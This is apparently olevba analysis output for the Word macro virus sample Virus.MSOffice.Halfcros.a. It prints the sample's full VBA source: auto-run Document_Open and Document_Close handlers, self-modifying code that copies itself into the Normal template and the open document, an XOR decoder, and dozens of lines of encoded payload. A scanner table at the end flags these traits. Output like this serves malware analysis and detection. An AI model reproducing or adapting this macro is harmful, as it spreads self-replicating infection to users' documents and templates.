olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Halfcros.a-c25f30e09f682e55dc50411a6418b50cd7e85963
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Halfcros.a-c25f30e09f682e55dc50411a6418b50cd7e85963 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































'InRun
' 35
'ThisDocumentN
Private Sub Workbook_Deactivate()
If ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(40, 1) <> "'InRun" Then Call Calculate_AddressX(98, 25)
End Sub
Private Sub Document_Open()
Call Calculate_Address(83, 15)
End Sub
Private Sub Document_Close()
Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule
With Iam: .ReplaceLine 40, "": Z = .CountOflines: done = Decode(.Lines(73, 10), 230): .InsertLines Z, done: Mail_Item: .DeleteLines Z, 10: .ReplaceLine Z, "End Sub": End With
Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Comp2 = Iam.Lines(41, 1): NormalTemplate.Saved = True:
CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH): t = Iam.Lines(42, 1): If t = "" Then Exit Sub
If Comp = Comp2 And t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & Right$(t, 1): ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument: Exit Sub
If Comp = Comp2 And t = "'ThisDocumentA" Then ActiveDocument.Saved = True: Exit Sub Else: If t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & t
End Sub
Private Function Calculate_AddressX(Start_Encode As Integer, Code_Lines As Integer)
Set Work_Book = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule
With Work_Book: Z = .CountOflines: done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With
End Function
Private Function Calculate_Address(Start_Encode As Integer, Code_Lines As Integer)
On Error Resume Next: CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH)
WhereAmI = Right$(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(42, 1), 1)
If WhereAmI = "N" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: Z = .CountOflines: done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With: NormalTemplate.Save
ActiveDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 41, Comp: End Function
Private Function Decode(s, k As Integer)
Dim r: r = "": For F = 1 To Len(s): a = (Mid$(s, F, 1)): If a = Chr(13) Or a = Chr(10) Then r = r + a: GoTo Over
If a = "'" Then a = "": r = r + a: GoTo Over
r = r + Chr((Asc(Mid$(s, F, 1))) Xor k): k = k + 2: If k = 250 Then k = 230
Over: Next F: Decode = r
End Function
'©†К©њ‚ќ†ЦЄѓ›џЃ‹Рј‘ЋЊЬИ№‰љРЉ�·€–ИЧМ­‚—•‚ќ©ЉЂ‰Ќ„ЪЦіЂ…Ќ†ВЇЂ‚�џ›‡њѓѓЂТЫ
'ЅђШі«‹џ‹Ш¶ќ„Рћ„«њћЮі„†”Џ‹‹�‡џњЪҐЊ‡љћ™ћ “ЂћШНИИ°¬џќџЗЦДБГМТОТЎµ™•ЌВО¬їЅїЗЪПИѕ„‹ћ
'ЎЌ…Њѓ…Дјњ™„•‚ќ¶љ…Љ‡њ—§‚ЉЏ†ЌДМТЮФФ°­­іі­Ґ ¦і¶І·її«ў®§™ћ’џ‹ћ‹¬їќ•Љ‰›…Љљ¬Ѕ’ђ‘…Ќ¶ФАА®±Ћ›ѓ„¶Ў‡“Ђ›…—ЂњК©–“—�ФФЖКҐњљ™ќљ…ОДБКСОТР
'§Џ‹’Ќ‡Вѕ‚›‚—Њѓё�ѓ€™ћ‘ҐЊ”Ѓ„‹ЖТРШЦЪ®ЈЇµ±јЅ··ґ№Ґ«Ї¦№ј±Є«‰Ћћ›Џ‚—Ё»‘…љ…џЃ–†Ё№ћЂЃ‰‰ІИЬДЄ¶ѓџК№ќ•ЂФҐќ’њѓ‚‰ѓ®±Ћ›ѓ„¶Ў‡“Ђ›…—ЂњК©–“—�ФФЖКҐњљ™ќљ…ОДБКСОТР
'Њљ№–�Д»Ѓ‚™–™—Ќ›Д­Љ”Ь§—Ћѓ©™М–њі„†Ц§�љЂ‡““Ђџ—€Ж№�Џ‚†Ѓ†Ё‡њ‚МИРРЁґ—‰ѓЫВМ
'Ј—ЂЦ±‡…КСОѕќ†›™ЉјЏЃћњ“Ђ“Ц°ЄєћЃљ——‚Ц°Є©ѓѓЂќљ“–’›ВЭЗЮ±›’ќ«‡Ћ™‚•ИФҐќ’ИЇ”Ќ•ћФЛШћ„«њћЮҐ›„“„‡…‡ќШР¶™—ЌЩДОЗЮ¤¶¦Љ‰‚ЏЏљЮ¤¶µ—‹�…‚‹ћ†‡Ш±’Ќ‡ДМ¤љќ…Ї‰љЃЋЃџ™ЦЯЦҐ‡Ћ‰Јџ–Ѓљќ
'±Ѓћ„ОµЉ—“”ЬИј…њіќђ“ШЫИЈЌѓЮѕќ�ќ•АЫАО№“™Ш»‰ќ„�Ў–ѕќ�ќ•ИЗМЯАЫОЦЦЇ†™‰њ„ѕќ�ќ•ИЫАО¦›†µ—‚ЌРМАў—„љ™…Ќ†…Ђ•ТЬї™‹Ж©ѓ›ћ†»ђґЏ†ЏџОЭТЕЖСКИИ©Ђ”Т§ѓљДТК©Ђ”ТЈџЊЋ
'ђ†­ћЂЬЈ™ЉЌЉ…ѓ…ѓЪЦґ—‰ѓЫВМЩЬ·љ—•ЌКїЏ†—·ћ™€ЏЏџФН¦†ѓќ
'ћ„«њћЮі„†”Џ‹‹�‡џњЪ§ЌЏњ
'Ї‚ЉР»’
'©†К©њ‚ќ†ЦЄѓ›џЃ‹Рј‘ЋЊЬИҐњљ™ќљ…Цµ‰њ‰ џЂ™—”¶љ…Ѓћ„ТЙЦѕ‡„™‰ФРЅ„‚‘‰†™Вё™ЂЃ…Ё”‡ћ‰Ќ„››�ШЫИ¬Ќ‚ѓ—
'§“ЊЖ©‰�­‘Ђ†џќ”ИЧМЇ“†ќЂќў‡‰™ѓ•њЂШ®¤ё�ѓ„•‘ЂШ®¤«…Ѓћџњ‘�Њ•АЫЕАіќђ“µ‰ЊџЂ‹КТЅђШ®‡џћЖѕќѓЯШЫИЫЮО±њђЦµЏ†џ�‹Шј›ЃСЖЦКЭЮРіљ’Ш«Ѓ„™љ•Ъє™ЏПИЦМЬЕТ ћќ€И§џ‰ІќЊЦЪЇњ™Мљ™џ‘Цћ‰љКЂ›ћ‘њЦЪЖОК­ћЂћќ•™’Ѓ…‚АҐЃ‘„¶‡…ЏАОАЮФФЇ‰†Ћ‰њР„ЖШИЖЉ“Мє�·ФЃЅЏєЋМ©•јќЈ‹Д
'»Џ�Оѕќ†›»‡љ�…‹‚ТЙЦ¶‰љ‡Ќ‚¤—™†”‡њЏВёІў†™’ѓ‹ћВёІ±››€‰†Џ‚љѓЪЕЯЦҐ‡Ћ‰Јџ–Ѓљќ
'ЁЎКСОѕќ†›™ЉјЏЃћњ“Ђ“Ц°ЄєћЃљ——‚Ц°Є©ѓѓЂќљ“–’›ВЭЗЮ±›’ќ«‡Ћ™‚•Ьёџ–ѓ›ВШЬЬТЕЯ
'№ЇИЧМЇ“†ќЂќў‡‰™ѓ•њЂШ®¤ё�ѓ„•‘ЂШ®¤«…Ѓћџњ‘�Њ•АЫЕАіќђ“µ‰ЊџЂ‹Юѕќ�ќ•АЮЮВРГЭ
'їћЖєѓ‹†„ЦЬё±КИУЕОНТЦІ—…ќ‡‰Ђ„јЦЦ¬ЋЌ„М џЂ™ї–•њ‹Ђ‚•–ФЛШІљџ‰Оµћ‡“ШЁ‡�Ѓ§ћЃЂ—”ЉЌЋМУРґ•љ‹ѓ
'ЎЊМј™•њ‚ЬО¦ЈАОЙЫФКЖЖК®ѓЌ…џ‘�ЊЁКК­Ђ”Тє™Љ‹«‹ћњ™—†Ш»‰ќ„�Ў–ѕќ�ќ•ИЦТОАТ ћќ€ИЇ”‡„Т§ѓљ
'ЇЋКѕ‡—љЂТР§ЎЖМЧЩТЙЦЪў‡‰™ѓ•њЂ·ЪЖј‚‰ЂРі—‚±€›ћЌ‚њ—ђЦЕЖј�™‹Р·�…ќЖ©‰�§ћЃЂ—”ЉЌЋМУРґ•љ‹ѓ
'ЎЊМј™•њ‚ЬО©ЈАОЙЫФКЖЖК®ѓЌ…џ‘�Њ§КК­Ђ”Тµ•ЊҐ‰�ћ‡•ЂЪµ—“†ћЈ€ј›љ“‹ЖФФМЮР¦њ“–Ж­’…љРЎЃ”
'±ЂИ¤ѓњќ»љ…Њ‡„†‰ЉРПФўЉ“ЌК­Ђ”Тµ•ЊЇ†™�Џњћ‘’ШЫИѕћ›•Т ћќ€ИЇ”‡„Т§ѓљ
'ЇЋКўЃ‚џЅ�‹’‰†Ђ‹”ТЙЦѕ‡„™‰О¤љ‘�ВЖ»Џ�О№њ’“›’Ѓ…‚ОНТє™Љ‹«‹ћњ™—†МШµЌћМ­‘Ђ†џќ”ИЧМЇ“†·—Љ”ЃЏћФР·�…ќЬИ№‰љР»љђќ…њѓѓЂРПФ·›’«‹ћњ™—†МШµЌћМ­‘Ђ†џќ”ИЧМ џЂ™µ™”љѓ‰њ
'§›ЂћШҐ‰�ћ‡•ЂОЦўЖХКДАіќЃ�Њ©Ћ¦…Ђ•ЃФЫШЧЭГЦО¦›†µ—‚ЌКСОЮѕќ�ќ•АЫАОЄЫОЦЅ€ЊК»‡„љОЦ№ЖХК¶ОЭТЕГ
'ЇЏњ‚М§ћ”‘•ЊЏ‡„ЦОЮ»љ…ќ”њ¦…Ђ•ЃФЗФЖѕѓћ­џ–‘МШИєЏњ‚‘‘‘є‘€ЌК¶ВРР±�њЖ»џЋМ
'№”Фё—”…Ј‚ќ„“�љќ‚ИЧМЁ‘ћ‡“ШІЂЏ‚ОЮ ‘†”‡‹Џ ‡ћ—ФВККИ©„њШБНЯШНИИё†™Ѓ°™›“…Џ‚љѕРФі”•ЌРМАў—„љ™…Ќ¦…Ђ•ТАДФЖ«‚ћЖГЛЭЦУЖК«О
'«ћ–ФЎ‘’Ђ
'©†К©њ‚ќ†ЦЄѓ›џЃ‹Рј‘ЋЊ
'µЌћМ«ЁТЙЦ¬ЋЃ™»Ѓ‚™–™—ЌЖј®ѕ‚ќћ“›’Жј®­џџ„™–ѓ†ћџА№†‘›РДј‚…ќ§ќ†ќљ‰‡ЃОЗЮ±›’ќ«‡Ћ™‚•
'»’Ц­Ґ‰™‰Жґ›†Ю№–�†…Ќ‘†ќ™–И»ћЌњ„‡„¦™’ЂКЗОТ®¶™—ЌЩДОЗЩТИИШДЄҐЈҐБРФ·–‚Иё…‰�†РЮЅѕЖ¦…Ђ•ЃЬВИКИЫЕВРЗЭЦДШИИҐЂў‡љФШІЂЏ‚
'«ЁЬ¦“€Љ‰‰‰ў™њ‘ЦМЦДКЇ†‚ЪЗПСЖГКО§ћ Ѓ�ЪЬИ№‰љРҐ›„њ©ЉЂМУРµ‘‚·„‚ЏЏљШЮФФЇ‰љЋВЇЂ‚�џ›‡њѓѓЂТЫОЦ±ЂИЅѓњ”Ѕ–њШЪЦКОМР¦њ“–ЖЇ…ёЃРЈЃџЊ№ј‚…ќ
'Ј—ЂЦЇ‰љЋЈЊљТЙЦ»”Ќ‹�‹їђћ“›’АИ»Ѓ‚–Ъ·€–„ѓЏЏ„››�ЪПТКї‹„ТєўШЫИЅѓњ”Ѕ–њЦЁ‡�ЃЏњ¦‘›€Љ‰ћ‰А¦°¤„—ЊЌ‰�А¦°·™•–‡„‰Ђ„ЃЬФ¬ЋЃ™ЁЃ“‡™“–’КГВ­џ–‘»—‚ќ†‰
'§–Т¦џџЋњОД ¤Ьёџ–ѓ›ВШЬЬТЕЯФЖЩЩЕОММФФ¬ЋЃ™ЁЃ“‡™“–’¦ИМє�—љ
'Ў—”ЊҐЋ„ЮЅ„‚‘‰†™ВЅ‘„‘ё—”…‹Ђѕ‚ќ™†ЊЖХКЄЏњЃ‘М
'¶ІЖ®‰‚•†‘є‘€Ќ™МЯЬТєўЦҐ‡џ‚љї”�џ–ѓ›РМ ¤ЬЅ�‹ѓљћ ‡ћ—‡ЦЙКИИј›’ћќ•Шµќ€МЄ™Ѓ•””ѓ©јДЗТИФё¬ИЎ„џ‹‚†ёџ–ѓ›КЮВРР»†ЊЏ‡„џА¦›†ѓ‹¶љ…�‹“†ќ™–ЖХКЄЏњЃ‘МЪЬ
'¦ѕВ§ћЃ‘„ЊЄЃ„‰ќРБШЦЪµ‘™�‹ќЬ¤„‘ђ‰ћ‰ѕ‚ќ’џ”ѓ»ћћ‡ћ•ЬФЪДКЖММТєїіЎ№«їѕјµј ©­µ­ё°Ѕџ”ЂЃ™”Ќ¶Ў‡“Ђ›…—Ђњ¶Ј€–›—“¤ЮЖЪ°«€‘‘љ¤«Ѓ‰ћЃѓќ’‚ШЈђ‰‰‚ТРШЦЪД§љ�‡џњ‡АЪДБКСОТРЦФЪ
'ЁјДҐЂѓ—†‚ґЏ†ЏџОДЮФФ«џ›ћ‰ѓЮў†џЋ‡њЏјњџ”ќљќµњ�…Ђ—ЪЦФЪДДКОМё№±Ї§Є§©­ўЇїµµ°Ї¦Ї°Ѕџ”ЂЃ™”Ќ¶Ў‡“Ђ›…—Ђњ¶Ј€–›—“¤ЮЖЪ° •…ФЈ‹ѓљКї‹„†ќ�џ•ґЇ”Ќ•ћЁ»‘…љ…џЃ–†ФіЂ…Ќ†ОМЬТЦФ·–њѓѓЂѓДЦФСЖХКОМТРЦ
'ё¬ИЎ„џ‹‚†ёџ–ѓ›КЩВРР±�њЖ»џЋМКТЈ™Љ‚§€†Аў‡љЦЪЁ‡�ЃЏњЬ ћ‘•¬…Џ›ќ—љ‚ЦўЃ™ЌЊњ—µ ЪЬ
'¦ѕВЄ•ћ‘‚ќЄЃ„‰ќРГШЦ¶ІЖ©ѓ›ћ†»ђ”Џ†Џџ
'ё™Ђ·™њѓИЧМ«ЁЬёџ–ѓ›ВЭВР·¬Ш»‰ќ„�Ў–ћќ�ќ•ИЗМЬЕЫОЦ¶ІЖЈ‚ќ•ЂЂє‘€Ќ™МЯЬТўџЉҐ‡Ћ‰Ф
'ѕ¦Ъ¤ќ–„‹Џ‹ј›љ“ШО¦ѕВ­џ‡љ‚·Ђ„ѓ‚‹ѓЫШЦЪЈ†ЋМЅ…ђЦМШµЌћМ ¤ТЙЦ¶‰њ‚…Ђ—И
'Ј™ЉЌЉ…ѓ…ѓЬµ’њИ»‹љ‹±ЃФ°‘ЉЌ¤Ќѓ•ИЙ·€–„ѓЏЏ„››�Цµњ‹ћљ…‚¤—ЊЋИМММ¬°›™“ЧЖИАО¶›�“ѕ‰љ‡ЌљКПЊљ¶‰љ‡Ќ‚ЬТµ’њІ‡§ћ›КПІ—”•Ќ
'№‰љРіЈЦЕЖј‚…ќ§ќ†ќљ‰‡ЃВёІў†™’ѓ‹ћВёІ±››€‰†Џ‚љѓЬЅ‚ќ‹АИё†™ЃЈ™ЉЌЉ…ѓ…ТЫЪµ—‚Ќ§ѓЉ…ћ‘
'Ґќ’ИЈ»ОНТЈ™ЉЌЉ…ѓ…ѓЪЦґ—‰ѓЫВМЩЬўґЁ”‡Ђ‰Ќ„Ьўґ»‰…љѓЂ•њЂ…ЦЇњЏЃЖТ¦њџ‹±‡�‡ЊџќџФСИ«…€‹Ѕќђѓ”ѓ
'ЎЊМј™•њ‚ЬОЎЅВў™њ‘…РТЪЖМЯЩЮФЗЛПИЦТОТ¦њџ‹ў‡‰™ѓ•њЂёЪЖј‚‰ЂР¤ќ„»‰ЊЏМУРіЈШґЏ†ЏџЖБЮФ·ЇИ«…™Ђ„Ѕ’љ‘€Ќ™МГРАБЯВЖЎЅВ§ћЃ‘„ЊЄЃ„‰ќРГШЦ®Џљ©ѓЉ•ИФїЇИєЏњ‚‘‘‘є‘€ЌКҐ№Ю±›ѓ–’§ЊЂ‡ћ—‡ЪШД­„€ОЈ‡–ФВЖЎЅВј•‚�—›ѓ¤ѓ‚‹РЖДЪШДК
'Ѕѓњ›ђ›™“•АИ®Ѓџ™ЕШЪПЖ©ЂЃѓ—ФҐ™ђЌ©„Џћ•‘…ВЫј�™‹
'µњђЦ±ЂТК»Ѓ‚–»”’И№џ…љК
'ЈЃџЊ№ј‚…ќК
'·љ’ШЇЋРМЅ•†Ф·ЇЖХКё†™ЃЈ™ЉЌЉ…ѓ…Ю¤¶¦Љ‰‚ЏЏљЮ¤¶µ—‹�…‚‹ћ†‡Ш±’Ќ‡ДМ¤љќ…Ї‰љЃЋЃџ™ЦЯЦҐ‡Ћ‰Јџ–ЃљќЬИ¬ѓњР›ФЛШЧИѕѓО§ќ†ќљ‰‡ЃџАіќЃ�Њ
'µЌћМ§§ТЙЦЇ‰љЃЋЃџ™‡Ю‘ПЖј®ѕ‚ќћ“›’Жј®­џџ„™–ѓ†ћџА№†‘›РДј‚…ќ§ќ†ќљ‰‡ЃОЗЮ±›’ќ«‡Ћ™‚•
'»’ЦЄЏЏ‚�КШ»ЈШґЏ†ЏџЖДАШЦЙПДКЭЭЩТИИШДј‚…ќґќ—ѓ•ѓ†ћўМР¦њ“–Жѕѓћ­џ–‘ЦЕЖ©ЅВў™њ‘…РЧДК­№Ю±›ѓ–’§ЊЂ‡ћ—‡ЦХЖЪЯЕФР»ЈШ±€›Џћљј›љ“‹ЖЩЖМё™Ђ·™њѓТКҐ№Ю ‘†”‡‹Џ ‡ћ—ФїЇИ«…™Ђ„Ѕ’љ‘€Ќ™АОТ·љ’Шµќ€ОФР»ЈШЄѓ�†ЌЌ•ѕќ�ќЖЬЪАОТР
'є“Ђ’ТК­№Ю ‘†”‡‹Џ ‡ћ—ФВИКИ©„њШБНЯВЖї…ћ…’ќ›ќ‹ОКЁѓЃ›ГЦЯЦµ‰њ‰ЉРПФўЉ“Ќ
Private Sub Mail_Item()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

